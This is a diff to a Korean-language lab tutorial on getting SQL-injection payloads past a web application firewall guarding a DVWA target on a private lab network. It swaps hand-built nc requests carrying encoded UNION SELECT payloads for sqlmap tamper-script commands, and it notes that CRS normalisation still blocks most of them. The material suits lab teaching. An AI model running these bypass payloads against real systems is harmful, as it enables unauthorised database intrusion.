@@ -239,11 +239,10 @@ graph TD
 el34 에서는 이런 인코딩 변형을 다음처럼 보낸다(이중 인코딩 예).
 
 ```bash
-echo "double=$(echo -en 'GET /?id=1%2527%20UNION HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
+ssh att@192.168.0.202 'sqlmap -u "http://dvwa.el34.lab/?id=1" --batch --tamper=chardoubleencode --level=2 --risk=2 --disable-coloring 2>&1 | grep -iE "WAF|403|blocked|bypass|not injectable"' 
 ```
 
-이 명령에서 `` 는 fw 게이트웨이(dvwa.el34.lab)에 보내되 Host 헤더로
-dvwa vhost 를 지정하고, `-w 'double=%{http_code}'` 는 응답 코드만 출력한다. **el34 의 실제
+`--tamper=chardoubleencode` 는 페이로드를 **이중 URL 인코딩**해 WAF 시그니처를 우회 시도한다. sqlmap 이 우회 성공/차단(WAF·403)을 보고한다. **el34 의 실제
 동작은 대부분 여전히 403** 이다 — 그 이유가 §4 의 정규화다.
 
 ---
@@ -313,8 +312,10 @@ graph TD
 el34 에서는 주석·탭 변형을 다음처럼 보낸다.
 
 ```bash
-echo "cmt=$(echo -en 'GET /?id=1%27%20UN/**/ION%20SE/**/LECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
-echo "tab=$(echo -en 'GET /?id=1%27%09UNION%09SELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
+# 공백→인라인 주석(/**/) 우회
+ssh att@192.168.0.202 'sqlmap -u "http://dvwa.el34.lab/?id=1" --batch --tamper=space2comment --level=2 --risk=2 --disable-coloring 2>&1 | grep -iE "WAF|403|blocked|bypass"'
+# 공백→랜덤 화이트스페이스(탭 등) 우회
+ssh att@192.168.0.202 'sqlmap -u "http://dvwa.el34.lab/?id=1" --batch --tamper=space2randomblank --level=2 --risk=2 --disable-coloring 2>&1 | grep -iE "WAF|403|blocked"' 
 ```
 
 이 변형들 중 **탭·대소문자는 el34 에서 여전히 403** 으로 막힌다 — CRS 정규화(다음 절)의
